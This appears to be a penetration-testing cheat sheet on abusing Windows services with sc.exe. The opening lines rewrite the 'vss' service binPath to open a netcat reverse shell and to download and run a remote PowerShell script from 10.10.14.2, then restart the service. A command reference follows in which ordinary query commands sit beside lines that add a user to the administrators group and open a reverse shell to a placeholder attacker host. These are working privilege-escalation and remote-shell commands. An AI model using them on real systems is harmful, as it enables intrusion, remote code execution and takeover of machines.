sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"  
sc.exe config vss binPath="C:\Windows\system32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/reverse.ps1')"  
sc.exe stop vss  
sc.exe start vss

#### Service Commands
Query the configuration of a service:
`> sc.exe qc <name>`
Query the current status of a service:
`> sc.exe query <name>`
Modify a configuration option of a service:
`> sc.exe config <name> <option>= <value>`
`> sc.exe config binpath= "net localgroup administrators user /add"` #add #group
`> sc.exe config binpath= "C:\Temp\nc.exe ATACKER PORT -e cmd.exe"` #shell #remote
Start/Stop a service:
`> net start/stop <name>`